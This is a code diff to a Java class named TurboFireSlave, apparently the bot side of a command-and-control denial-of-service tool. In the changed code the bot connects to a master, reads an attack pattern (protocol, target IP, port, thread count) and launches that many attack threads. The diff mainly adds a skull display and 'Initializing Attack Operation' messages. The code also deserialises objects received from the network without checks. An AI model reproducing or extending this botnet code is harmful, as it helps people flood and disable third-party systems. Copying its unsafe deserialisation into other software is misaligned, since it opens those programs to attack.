@@ -16,6 +16,8 @@
  */
 package app;
 
+import java.util.concurrent.TimeUnit;
+
 import view.GUI;
 import utilies.AttackPattern;
 import utilies.AttackFactory;
@@ -28,6 +30,7 @@ import java.io.BufferedReader;
 import java.io.ObjectInputStream;
 import java.io.Serializable;
 import java.net.Socket;
+import java.net.SocketException;
 import java.net.Inet4Address;
 
 /**
@@ -88,20 +91,41 @@ public class TurboFireSlave implements Serializable {
     public void startSlave() {
         while(true) {
             try {
-                System.out.println("I'M ONLINE");
                 Socket socket = new Socket(this.masterAddress, this.masterPort);
                 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                 this.attackPattern = (AttackPattern) ois.readObject();
+                this.gui.showMessage("Command Received from Master!");
+                for(int i=1 ; i < 15 ; i++) {
+                    TimeUnit.SECONDS.sleep(1);
+                    if(i%3 == 1) {
+                        this.gui.clean();
+                        this.gui.showSkull();
+                        this.gui.showMessage("Initializing Attack Operation .");
+                    }else if(i%3 == 2) {
+                        this.gui.clean();
+                        this.gui.showSkull();
+                        this.gui.showMessage("Initializing Attack Operation ..");
+                    }else if(i%3 == 0) {
+                        this.gui.clean();
+                        this.gui.showSkull();
+                        this.gui.showMessage("Initializing Attack Operation ...");
+                    }
+                }
+                this.gui.showMessage(
+                    "Attack Command: " + this.attackPattern.getProtocol() + " | " + this.attackPattern.getIP() + " | " + 
+                    this.attackPattern.getPort() + " | " + this.attackPattern.getThreadAmount() + " | " +
+                    this.attackPattern.getMessage()
+                    );
                 
-                System.out.println(this.attackPattern.getProtocol() + " - " + this.attackPattern.getIP() + " - " + this.attackPattern.getPort() + " - " + this.attackPattern.getThreadAmount());
                 ois.close();
                 this.attackPattern.setAdditionalInformation(Inet4Address.getLocalHost().getHostAddress().toString());
                 for(int i = 0 ; i < this.attackPattern.getThreadAmount() ; i++) {
                     Thread t = new Thread(AttackFactory.createAttack(this.attackPattern, this.masterAddress, 2525));
                     t.start();
-                    System.out.println("ok");
                 }
                 break;
+            }catch (InterruptedException ie) {
+                GUI.showExceptionLog(ie.toString());
             } catch (SocketException se) {
                 this.gui.showExceptionLog(se.toString());
             } catch (NotSerializableException nse) {
